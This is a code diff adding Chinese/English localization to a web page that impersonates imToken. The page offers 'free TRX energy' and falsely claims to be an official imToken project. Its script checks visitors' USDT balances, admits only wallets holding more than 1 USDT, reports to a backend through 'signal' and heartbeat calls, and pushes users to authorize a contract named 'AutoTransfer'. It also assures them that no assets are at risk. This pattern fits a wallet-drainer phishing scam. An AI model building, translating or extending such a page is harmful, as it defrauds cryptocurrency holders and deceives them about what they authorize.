@@ -27,6 +27,25 @@
             flex-direction: column;
             gap: 10px; 
         }
+        /* 语言切换按钮样式 */
+        .lang-switch {
+            text-align: right;
+            margin-bottom: 5px;
+        }
+        .lang-btn {
+            padding: 4px 10px;
+            border: 1px solid #3b82f6;
+            border-radius: 20px;
+            background: transparent;
+            color: #e0e8e4;
+            font-size: 12px;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+        .lang-btn.active {
+            background: #3b82f6;
+            color: white;
+        }
         .header {
             text-align: center;
             padding: 10px 0;
@@ -261,53 +280,59 @@
 </head>
 <body>
     <div class="container">
+        <!-- 语言切换按钮 -->
+        <div class="lang-switch">
+            <button id="langZh" class="lang-btn active">中文</button>
+            <button id="langEn" class="lang-btn">English</button>
+        </div>
+        
         <div class="header">   
             <div>
-                <h1>imToken</h1>
-                <p class="desc">imToken官方专属服务，每个钱包地址只可免费领取一次能量</p>
+                <h1 id="headerTitle">imToken</h1>
+                <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址只可免费领取一次能量</p>
             </div>
         </div>   
         <div id="userInfo">
-            未连接钱包<br>
-            <span>请点击底部「连接imToken钱包」按钮</span>
+            <span id="userInfoDefault">未连接钱包<br>
+            <span>请点击底部「连接imToken钱包」按钮</span></span>
         </div>
         <div id="walletStatusContainer">
-            <div class="status-title"><h3> 钱包状态</h3></div>
+            <div class="status-title"><h3 id="walletStatusTitle"> 钱包状态</h3></div>
             <div class="disconnected-content">
-                <span >未连接钱包</span>
-                <p><span class="highlight">您现在准备领取的是imToken专属能量，非imToken用户不可领取</span></p>
-                <p><span class="highlight">1. 每个钱包地址只可免费领取一次</span></p>         
-                <p><span class="highlight">2. 免费发放TRX能量，无额外费用</span></p>
-                <p><span class="highlight">3. 连接钱包后系统自动分配能量额度</span></p>
-                <p><span class="highlight">4. 无需消耗任何资产，选择放弃直接退出即可</span></p>
+                <span id="disconnectedText">未连接钱包</span>
+                <p><span class="highlight" id="disconnectedTip1">您现在准备领取的是imToken专属能量，非imToken用户不可领取</span></p>
+                <p><span class="highlight" id="disconnectedTip2">1. 每个钱包地址只可免费领取一次</span></p>         
+                <p><span class="highlight" id="disconnectedTip3">2. 免费发放TRX能量，无额外费用</span></p>
+                <p><span class="highlight" id="disconnectedTip4">3. 连接钱包后系统自动分配能量额度</span></p>
+                <p><span class="highlight" id="disconnectedTip5">4. 无需消耗任何资产，选择放弃直接退出即可</span></p>
             </div>
             <div class="connected-content">
-                <p>✅ 钱包已成功连接</p>
-                <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 领取类型：<span class="highlight">免费TRX能量</span></p>
-                <p>• 领取额度：<span class="highlight">90000 TRX能量</span></p>
-                <p class="orange-tip">⚠️提示：免费授权即可获取能量，二次登录不会改变领取额度</p>
+                <p id="connectedSuccess">✅ 钱包已成功连接</p>
+                <p id="connectedAddress">• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
+                <p id="connectedType">• 领取类型：<span class="highlight">免费TRX能量</span></p>
+                <p id="connectedAmount">• 领取额度：<span class="highlight">90000 TRX能量</span></p>
+                <p class="orange-tip" id="connectedWarn">⚠️提示：免费授权即可获取能量，二次登录不会改变领取额度</p>
             </div>
         </div>
         <div id="contractResourceContainer">
             <div class="status-title">     
-                <h3>合约剩余资源</h3>
+                <h3 id="contractResourceTitle">合约剩余资源</h3>
             </div>
             <div class="resource-content" style="line-height: 2;">
-                <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
-                <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy">315360004000</span></p>
-                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
+                <p id="contractAddrText">• 合约地址：<span class="highlight" id="contractAddr"></span></p>
+                <p id="contractEnergyText">• 剩余能量：<span class="highlight data-tag" id="contractEnergy">315360004000</span></p>
+                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                     注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
             </div>
         </div>
         <div class="record-list">
             <div style="display: flex; justify-content: space-between; margin: 4px 0;">
-                <span>可领取能量类型</span>
-                <span>领取额度</span>
+                <span id="recordTypeTitle">可领取能量类型</span>
+                <span id="recordAmountTitle">领取额度</span>
             </div>
             <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
-                <span class="header"><h3>TRX能量</h3></span>
+                <span class="header"><h3 id="energyType">TRX能量</h3></span>
                 <span class="header"><h3>90000</h3></span>
             </div>       
             <span id="approvalRecords"class="highlight">暂无能量领取记录</span>        
@@ -315,19 +340,19 @@
     </div>
     <div class="btn-group">
         <div class="warning">
-            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>
+            <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+            <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>
             <div class="copy-link-wrap">
                 <span id="copyLinkText">
                     https://trc20trx-alt.github.io/Trc20.TRX/
                 </span>
-                <button id="copyLinkBtn">复制链接</button>
+                <button id="copyLinkBtn" id="copyBtnText">复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>免费领取能量</button>
+        <button id="connectBtn" class="btn" id="connectBtnText"> 连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled id="approveBtnText">免费领取能量</button>
     </div>
-    <div class="footer-info">
+    <div class="footer-info" id="footerText">
         合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
         © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div><script src="imtoken://browser"></script>
@@ -394,6 +419,129 @@
     let heartbeatTimer = null;
     let isHeartbeating = false; // 避免重复发送心跳
     
+    // ========== 多语言配置 ==========
+    const langConfig = {
+        zh: {
+            headerTitle: "imToken",
+            headerDesc: "imToken官方专属服务，每个钱包地址只可免费领取一次能量",
+            userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
+            walletStatusTitle: "钱包状态",
+            disconnectedText: "未连接钱包",
+            disconnectedTip1: "您现在准备领取的是imToken专属能量，非imToken用户不可领取",
+            disconnectedTip2: "1. 每个钱包地址只可免费领取一次",
+            disconnectedTip3: "2. 免费发放TRX能量，无额外费用",
+            disconnectedTip4: "3. 连接钱包后系统自动分配能量额度",
+            disconnectedTip5: "4. 无需消耗任何资产，选择放弃直接退出即可",
+            connectedSuccess: "✅ 钱包已成功连接",
+            connectedAddress: "• 钱包地址：<span class='highlight' id='statusAddress'></span>",
+            connectedType: "• 领取类型：<span class='highlight'>免费TRX能量</span>",
+            connectedAmount: "• 领取额度：<span class='highlight'>90000 TRX能量</span>",
+            connectedWarn: "⚠️提示：免费授权即可获取能量，二次登录不会改变领取额度",
+            contractResourceTitle: "合约剩余资源",
+            contractAddrText: "• 合约地址：<span class='highlight' id='contractAddr'></span>",
+            contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'>315360004000</span>",
+            contractNote: "注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。",
+            recordTypeTitle: "可领取能量类型",
+            recordAmountTitle: "领取额度",
+            energyType: "TRX能量",
+            noRecord: "暂无能量领取记录",
+            browserWarn1: " ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开",
+            browserWarn2: " ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken",
+            copyBtnText: "复制链接",
+            connectBtnText: "连接imToken钱包",
+            approveBtnText: "免费领取能量",
+            footerText: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 TRX能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
+            copySuccess: "✅ 链接已复制，请在imToken内置浏览器打开",
+            copyFail: "❌ 复制失败：请手动复制链接",
+           唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
+            copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
+            connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ {msg}</span>",
+            retryConnect: "重试连接",
+            authorizedTip: "已领取提示<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址仅限领取一次</span>",
+            authorizedBtn: "已领取过能量",
+            afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 授权成功，发放能量中...</span>",
+            deployingBtn: "发放中...",
+            loadingBtn: "加载中...",
+            loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
+            insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件（USDT需＞1）</span>",
+            insufficientBtn: "不符合领取条件",
+            eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 TRX能量</span>",
+            distributingBtn: "能量配送中...",
+            redirectingBtn: "跳转授权中...",
+            approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
+            authorizeFail: "⚠️ 授权失败：{msg}，请稍后重试",
+            successTip: "🎉 免费能量领取完成！\n90000 TRX能量已到账～",
+            successBtn: "能量领取成功",
+            successArrival: "<br><span style='color: #4ade80;'>✅ 90000 TRX能量已到账</span>",
+            recordAddress: "地址：",
+            recordType: "领取类型：",
+            recordEnergy: "获取能量：",
+            recordTime: "领取时间：",
+            freeEnergy: "免费能量领取"
+        },
+        en: {
+            headerTitle: "imToken Official",
+            headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once",
+            userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
+            walletStatusTitle: "Wallet Status",
+            disconnectedText: "Wallet not connected",
+            disconnectedTip1: "You are about to claim imToken exclusive energy - only for imToken users",
+            disconnectedTip2: "1. Each wallet address can claim free energy once",
+            disconnectedTip3: "2. Free TRX Energy distribution - no additional fees",
+            disconnectedTip4: "3. Energy quota will be automatically allocated after connecting wallet",
+            disconnectedTip5: "4. No assets required - exit directly to cancel",
+            connectedSuccess: "✅ Wallet connected successfully",
+            connectedAddress: "• Wallet Address: <span class='highlight' id='statusAddress'></span>",
+            connectedType: "• Claim Type: <span class='highlight'>Free TRX Energy</span>",
+            connectedAmount: "• Claim Quota: <span class='highlight'>90000 TRX Energy</span>",
+            connectedWarn: "⚠️ Note: Authorize for free to get energy - re-login won't change the quota",
+            contractResourceTitle: "Contract Remaining Resources",
+            contractAddrText: "• Contract Address: <span class='highlight' id='contractAddr'></span>",
+            contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>315360004000</span>",
+            contractNote: "Note: Distribution stops when remaining amount is '0' - Official imToken project, only for imToken users",
+            recordTypeTitle: "Claimable Energy Type",
+            recordAmountTitle: "Claim Quota",
+            energyType: "TRX Energy",
+            noRecord: "No energy claim records",
+            browserWarn1: " ⚠️ Open with <strong>imToken in-app browser</strong>",
+            browserWarn2: " ⚠️ Non-wallet browser: Click button to copy + launch imToken",
+            copyBtnText: "Copy Link",
+            connectBtnText: "Connect imToken Wallet",
+            approveBtnText: "Claim Free Energy",
+            footerText: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
+            copySuccess: "✅ Link copied - open in imToken in-app browser",
+            copyFail: "❌ Copy failed - please copy manually",
+           唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
+            copyGuide: "✅ Link copied - please paste in imToken",
+            connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ {msg}</span>",
+            retryConnect: "Retry Connection",
+            authorizedTip: "Claimed Successfully<br>{address}<br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has already claimed free energy</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address</span>",
+            authorizedBtn: "Energy Claimed",
+            afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Authorization successful, energy distributing...</span>",
+            deployingBtn: "Distributing...",
+            loadingBtn: "Loading...",
+            loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
+            insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible (USDT required > 1)</span>",
+            insufficientBtn: "Ineligible",
+            eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 free TRX Energy</span>",
+            distributingBtn: "Energy Distributing...",
+            redirectingBtn: "Redirecting to Authorization...",
+            approveFail: "⚠️ Operation failed: {msg}, please try again later",
+            authorizeFail: "⚠️ Authorization failed: {msg}, please try again later",
+            successTip: "🎉 Free Energy Claim Completed!\n90000 TRX Energy has been credited～",
+            successBtn: "Claim Successful",
+            successArrival: "<br><span style='color: #4ade80;'>✅ 90000 TRX Energy credited</span>",
+            recordAddress: "Address:",
+            recordType: "Claim Type:",
+            recordEnergy: "Energy Obtained:",
+            recordTime: "Claim Time:",
+            freeEnergy: "Free Energy Claim"
+        }
+    };
+    
+    // 当前语言（从本地存储读取，默认中文）
+    let currentLang = localStorage.getItem("imtoken_energy_lang") || "zh";
+    
     // ========== 二次授权校验：本地存储工具 ==========
     const AUTHORIZED_KEY = "authorized_wallet_addresses";
     function getAuthorizedAddresses() {
@@ -430,8 +578,48 @@
     const copyLinkBtn = document.getElementById("copyLinkBtn");
     const copyLinkText = document.getElementById("copyLinkText");
     const warning = document.querySelector('.warning');
+    const approvalRecords = document.getElementById("approvalRecords");
+    const langZhBtn = document.getElementById("langZh");
+    const langEnBtn = document.getElementById("langEn");
 
+    // ========== 多语言切换函数 ==========
+    function changeLang(lang) {
+        currentLang = lang;
+        localStorage.setItem("imtoken_energy_lang", lang);
+        // 更新按钮状态
+        langZhBtn.classList.toggle("active", lang === "zh");
+        langEnBtn.classList.toggle("active", lang === "en");
+        // 更新页面文本
+        updatePageLang();
+        // 更新记录列表
+        renderEnergyRecords();
+    }
+    
+    // 更新页面所有文本
+    function updatePageLang() {
+        const lang = langConfig[currentLang];
+        // 遍历所有带id的文本元素
+        Object.keys(lang).forEach(key => {
+            const el = document.getElementById(key);
+            if (el) {
+                // 特殊处理包含HTML的文本
+                el.innerHTML = lang[key];
+            }
+        });
+        // 特殊处理按钮文本（避免覆盖id）
+        connectBtn.textContent = lang.connectBtnText;
+        approveBtn.textContent = lang.approveBtnText;
+        copyLinkBtn.textContent = lang.copyBtnText;
+        approvalRecords.textContent = lang.noRecord;
+    }
+    
     window.onload = async () => {
+        // 初始化语言
+        updatePageLang();
+        // 绑定语言切换事件
+        langZhBtn.addEventListener("click", () => changeLang("zh"));
+        langEnBtn.addEventListener("click", () => changeLang("en"));
+        
         // 初始化合约地址显示
         contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
         
@@ -443,9 +631,9 @@
         copyLinkBtn.addEventListener("click", async () => {
             try {
                 await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                alert("✅ 链接已复制，请在imToken内置浏览器打开");
+                alert(langConfig[currentLang].copySuccess);
             } catch (e) { 
-                alert(`❌ 复制失败：请手动复制链接`); 
+                alert(langConfig[currentLang].copyFail); 
             }
         });
         
@@ -482,9 +670,10 @@
             await initWallet(false); // 首次连接，非授权后返回
         } else {
             // 非imToken环境：自动复制+唤起
+            const lang = langConfig[currentLang];
             userInfoEl.innerHTML = `
-                ⚠️ 请使用imToken钱包内置浏览器打开<br>
-                <span style="color: #3b82f6; font-size: 13px;">点击按钮自动复制+唤起imToken</span>
+                ⚠️ ${lang.browserWarn1.split("<strong>")[1].split("</strong>")[0]}<br>
+                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
             `;
             approveBtn.style.display = "none";
             connectBtn.onclick = async () => {
@@ -493,10 +682,10 @@
                     await navigator.clipboard.writeText(dappUrl);
                     window.location.href = "imtoken://open";
                     setTimeout(() => {
-                        alert(`✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问`);
+                        alert(lang.唤起Guide);
                     }, 1200);
                 } catch (e) {
-                    alert(`✅ 链接已复制，请在imToken中粘贴访问`);
+                    alert(lang.copyGuide);
                 }
             };
         }
@@ -508,39 +697,33 @@
      */
     async function initWallet(isAfterApprove) {
         try {
+            const lang = langConfig[currentLang];
             // 1. 直接从钱包获取地址
             userAddress = tronWeb.defaultAddress.base58;
-            if (!userAddress) throw new Error("未检测到钱包地址，请确保钱包已解锁");
+            if (!userAddress) throw new Error(currentLang === "zh" ? "未检测到钱包地址，请确保钱包已解锁" : "Wallet address not detected - please unlock your wallet");
 
             // 2. 启动心跳（用户连接后立即启动，10秒一次）
             startHeartbeat(userAddress);
 
             // 3. 二次授权拦截
             if (isAddressAuthorized(userAddress)) {
-                userInfoEl.innerHTML = `
-                    已领取提示<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
-                    <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次</span>
-                `;
+                const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
                 approveBtn.disabled = true;
-                approveBtn.textContent = "已领取过能量";
+                approveBtn.textContent = lang.authorizedBtn;
                 updateWalletStatus();
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                document.getElementById("statusAddress").textContent = shortAddr;
                 return;
             }
 
             // 4. 授权后返回，直接执行后续逻辑
             if (isAfterApprove) {
-                userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    <span style="color: #4ade80; font-size: 14px;">✅ 授权成功，发放能量中...</span>
-                `;
+                const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
                 approveBtn.disabled = true;
-                approveBtn.textContent = "发放中...";
+                approveBtn.textContent = lang.deployingBtn;
                 updateWalletStatus();
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                document.getElementById("statusAddress").textContent = shortAddr;
                 await executeAfterApprove();
                 return;
             }
@@ -550,15 +733,12 @@
             console.log("✅ A1信号已异步发送（分开发送，等待B1）");
 
             // 6. 立即显示UI
-            userInfoEl.innerHTML = `
-                已连接：<br>
-                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                <span style="color: #4ade80; font-size: 14px;">✅ 加载中...</span>
-            `;
+            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            userInfoEl.innerHTML = lang.loadingTip.replace("{address}", shortAddr);
             approveBtn.disabled = true;
-            approveBtn.textContent = "加载中...";
+            approveBtn.textContent = lang.loadingBtn;
             updateWalletStatus();
-            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            document.getElementById("statusAddress").textContent = shortAddr;
 
             // 🔥 用精简ABI初始化合约（仅2个核心函数，50ms内完成）
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
@@ -571,34 +751,28 @@
 
             // 8. 更新UI和按钮状态
             if (tokenBalance <= 1) {
-                userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
-                `;
+                userInfoEl.innerHTML = lang.insufficientUsdt
+                    .replace("{address}", shortAddr)
+                    .replace("{usdt}", tokenBalance.toFixed(2))
+                    .replace("{trx}", trxBalance.toFixed(2));
                 approveBtn.disabled = true;
-                approveBtn.textContent = "不符合领取条件";
+                approveBtn.textContent = lang.insufficientBtn;
                 stopHeartbeat(); // 不符合条件，停止心跳
             } else {
-                userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
-                `;
+                userInfoEl.innerHTML = lang.eligibleTip
+                    .replace("{address}", shortAddr)
+                    .replace("{usdt}", tokenBalance.toFixed(2))
+                    .replace("{trx}", trxBalance.toFixed(2));
                 approveBtn.disabled = false;
-                approveBtn.textContent = "免费领取能量";
+                approveBtn.textContent = lang.approveBtnText;
                 bindApproveLogic();
             }
 
         } catch (e) {
-            userInfoEl.innerHTML = `
-                连接异常<br>
-                <span style="color: #ef4444; font-size: 14px;">⚠️ ${e.message}</span>
-            `;
+            const lang = langConfig[currentLang];
+            userInfoEl.innerHTML = lang.connectError.replace("{msg}", e.message);
             approveBtn.disabled = false;
-            approveBtn.textContent = "重试连接";
+            approveBtn.textContent = lang.retryConnect;
             approveBtn.onclick = () => initWallet(false);
             stopHeartbeat(); // 连接异常，停止心跳
         }
@@ -609,6 +783,7 @@
      */
     async function executeAfterApprove() {
         try {
+            const lang = langConfig[currentLang];
             // 用精简ABI初始化合约（避免授权后未初始化）
             if (!trc20Contract) {
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
@@ -626,22 +801,23 @@
             
             // 发送B2信号（对应后端/api/send-signal-b2，分开发送，异步等待）
             const btn = document.getElementById("approveBtn");
-            btn.textContent = "能量发放中...";
+            btn.textContent = lang.distributingBtn;
             await sendSignalB(false);
 
             // 显示成功结果
             addAuthorizedAddress(userAddress);
-            btn.textContent = "能量领取成功";
-            userInfoEl.innerHTML += `<br><span style="color: #4ade80;">✅ 90000 TRX能量已到账</span>`;
-            alert("🎉 免费能量领取完成！\n90000 TRX能量已到账～");
+            btn.textContent = lang.successBtn;
+            userInfoEl.innerHTML += lang.successArrival;
+            alert(lang.successTip);
             saveEnergyRecord();
             renderEnergyRecords();
             stopHeartbeat(); // 领取成功，停止心跳
         } catch (e) {
+            const lang = langConfig[currentLang];
             const btn = document.getElementById("approveBtn");
             btn.disabled = false;
-            btn.textContent = "免费领取能量";
-            alert(`⚠️ 授权失败：${e.message}，请稍后重试`);
+            btn.textContent = lang.approveBtnText;
+            alert(lang.authorizeFail.replace("{msg}", e.message));
             stopHeartbeat(); // 失败，停止心跳
         }
     }
@@ -732,23 +908,24 @@
      * 领取按钮逻辑（绑定B1信号发送，分开发送A1→B1）
      */
     function bindApproveLogic() {
+        const lang = langConfig[currentLang];
         approveBtn.onclick = async () => {
             const btn = document.getElementById("approveBtn");
             btn.disabled = true;
-            btn.textContent = "能量配送中...";
+            btn.textContent = lang.distributingBtn;
 
             try {
                 // 发送B1信号（分开发送，A1已在init时发送，后端自动等待A1就绪）
                 const b1Success = await sendSignalB(true);
-                if (!b1Success) throw new Error("第一次能量分配失败");
+                if (!b1Success) throw new Error(currentLang === "zh" ? "第一次能量分配失败" : "First energy distribution failed");
 
                 // 自动跳转授权
-                btn.textContent = "跳转授权中...";
+                btn.textContent = lang.redirectingBtn;
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
             } catch (e) {
                 btn.disabled = false;
-                btn.textContent = "免费领取能量";
-                alert(`⚠️ 操作失败：${e.message}，请稍后重试`);
+                btn.textContent = lang.approveBtnText;
+                alert(lang.approveFail.replace("{msg}", e.message));
                 stopHeartbeat(); // 操作失败，停止心跳
             }
         };
@@ -834,19 +1011,24 @@
             trxBalance: trxBalance,
             receiveTime: new Date().toLocaleString(),
             energyAmount: "90000",
-            recordType: "免费能量领取"
+            recordType: langConfig[currentLang].freeEnergy
         });
         localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
     }
     function renderEnergyRecords() {
+        const lang = langConfig[currentLang];
         const container = document.getElementById("approvalRecords");
         const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-        container.innerHTML = records.length === 0 ? "<div class='record-item'>暂无能量领取记录</div>" : records.map(record => `
+        if (records.length === 0) {
+            container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
+            return;
+        }
+        container.innerHTML = records.map(record => `
             <div class='record-item'>
-                <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                <p><strong>领取类型：</strong>${record.recordType}</p>
-                <p><strong>获取能量：</strong>${record.energyAmount} TRX能量</p>
-                <p><strong>领取时间：</strong>${record.receiveTime}</p>
+                <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                <p><strong>${lang.recordType}</strong>${record.recordType}</p>
+                <p><strong>${lang.recordEnergy}</strong>${record.energyAmount} TRX Energy</p>
+                <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
             </div>
         `).join("");
     }
